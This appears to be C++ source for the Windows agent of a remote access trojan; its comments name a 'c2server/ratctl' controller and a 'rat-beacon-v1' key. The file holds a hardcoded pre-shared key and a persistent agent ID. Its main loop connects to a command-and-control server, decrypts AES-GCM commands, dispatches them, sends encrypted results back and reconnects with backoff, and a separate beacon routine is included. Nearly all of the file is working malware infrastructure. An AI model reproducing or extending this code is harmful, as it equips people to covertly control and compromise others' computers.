#include "framework.h"
#include "pch.h"
#include "types.h"

#include "beacon.h"
#include "protocol.h"
#include "cmd_dispatch.h"
#include "session.h"
#include "net.h"
#include "crypto.h"

#include <Windows.h>
#include <stdint.h>
#include <process.h>
#include <bcrypt.h>

#include <string>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "bcrypt.lib")

namespace
{

	// 预共享密钥（与 c2server/ratctl 一致，M1 编译期内置）
	const char kPskHex[] =
		"0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f20";

	// agent_id 持久化：首次运行随机生成并保存到 agent.id，重连/重启后复用同一 ID。
	// （服务器以 agent_id 识别同一台机器；重连后仍是同一条会话记录）
	void load_or_create_agent_id(uint8_t out[16])
	{
		FILE* f = NULL;
		errno_t err = fopen_s(&f, "agent.id", "rb");
		if (f)
		{
			if (fread(out, 1, 16, f) == 16)
			{
				fclose(f);
				return;
			}
			fclose(f);
		}
		long status = BCryptGenRandom(nullptr, out, 16, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
		//if (status != 0)
		//	return;
		f = NULL;
		err = fopen_s(&f, "agent.id", "wb");
		if (f)
		{
			fwrite(out, 1, 16, f);
			fclose(f);
		}
	}

	int run_agent(const std::string &host, uint16_t port)
	{
		c2::AgentConfig cfg;
		cfg.host = host;
		cfg.port = port;

		cfg.psk.resize(32);

		for (size_t i = 0; i < 32; ++i)
		{
			char b[3] = {kPskHex[i * 2], kPskHex[i * 2 + 1], 0};
			cfg.psk[i] = (uint8_t)strtol(b, nullptr, 16);
		}

		load_or_create_agent_id(cfg.agent_id);

		cfg.os_info = "Windows";

		int delay = 1;
		for (;;)
		{
			printf("[*] connecting to %s:%u...\n", host.c_str(), port);
			c2::Session s;
			std::string err;

			if (!c2::session_handshake(s, cfg, err))
			{
				printf("[-] handshake failed: %s\n", err.c_str());
			}
			else
			{
				printf("[+] connected, session key derived\n");
				delay = 1;

				// 启动心跳线程
				std::atomic<bool> running{true};
				c2::HeartbeatCtx hctx{&s, &cfg, &running};
				//HANDLE ht = (HANDLE)_beginthreadex(nullptr, 0, c2::heartbeat_proc, &hctx, 0, nullptr);

				c2::Header h;
				std::vector<uint8_t> payload;

				uint32_t last_seq = 0;
				while (c2::net_read_packet(s.sock, h, payload, -1))
				{
					if (!(h.flags & c2::kFlagEncrypted))
						continue; // 均为加密包

					std::vector<uint8_t> plain;
					std::string err;

					if (!c2::aes_gcm_decrypt(s.key.data(), s.key.size(), payload.data(), payload.size(), plain, err))
						continue;

					if (h.seq <= last_seq)
						continue; // 重放/乱序丢弃

					last_seq = h.seq;

					// 分发（业务 payload 前 16B 为 agent_id，由 C2 路由，本地跳过）
					uint8_t status = 0;
					std::vector<uint8_t> resp;
					//size_t arg_off = plain.size() > c2::kAgentIdLen ? c2::kAgentIdLen : plain.size();
					size_t arg_off = 0;
					if (!c2::handle_command(h.cmd, plain.data() + arg_off,
											plain.size() - arg_off, resp, status))
						continue; // 未知指令不回

					// CMD_RESULT：payload = req_seq(4) + status(1) + result
					std::vector<uint8_t> out;
					uint32_t req = h.seq;
					for (int i = 0; i < 4; ++i)
						out.push_back((uint8_t)(req >> (8 * i)));
					out.push_back(status);
					out.insert(out.end(), resp.begin(), resp.end());

					std::vector<uint8_t> sealed;
					if (!c2::aes_gcm_encrypt(s.key.data(), s.key.size(),
											 out.data(), out.size(), sealed, err))
						continue;
					c2::Header rh;
					rh.flags = c2::kFlagEncrypted;
					rh.seq = h.seq; // 回显请求 seq（C2 靠它查 relay）
					rh.cmd = c2::kCmdResult;
					rh.plugin = h.plugin;
					rh.timestamp = GetTickCount64();
					if (!c2::net_write_packet(s.sock, rh, sealed.data(), sealed.size()))
						break;
				}

				printf("[-] connection lost, reconnecting...\n");
				running.store(false);
				//if (ht)
				//{
				//	WaitForSingleObject(ht, 2000);
				//	CloseHandle(ht);
				//}
				c2::net_close(s.sock);
			}
			Sleep(delay * 1000);
			if (delay < 60)
				delay *= 2; // 1s→2s→4s→…→60s
		}

		return 0;
	}

}

status_t process_beacon(HMODULE hModule)
{
	std::string host = "127.0.0.1";
	uint16_t port = 8080;
	int sleeptime = 60;

	c2::AgentConfig cfg;
	cfg.host = host;
	cfg.port = port;
	cfg.psk.resize(32);
	for (size_t i = 0; i < 32; ++i) {
		char b[3] = { kPskHex[i * 2], kPskHex[i * 2 + 1], 0 };
		cfg.psk[i] = (uint8_t)strtol(b, nullptr, 16);
	}
	load_or_create_agent_id(cfg.agent_id);
	cfg.os_info = "Windows";

	// beacon_key = HKDF-SHA256(PSK, agent_id, "rat-beacon-v1")（协议 §8.2）
	std::vector<uint8_t> beacon_key =
		c2::hkdf_sha256(cfg.psk.data(), cfg.psk.size(), cfg.agent_id, 16,
			(const uint8_t*)"rat-beacon-v1", 13, 32);

	c2::run_beacon(host, port, cfg, beacon_key.data(), sleeptime);
	return 0;
}

status_t process_entrypoint(HMODULE hModule)
{
	std::string host = "127.0.0.1";
	uint16_t port = 4444;

	if (!c2::net_init())
	{
		printf("[-] WSAStartup failed\n");
		return -1;
	}

	int rc = run_agent(host, port);
	c2::net_cleanup();

	return rc;
}
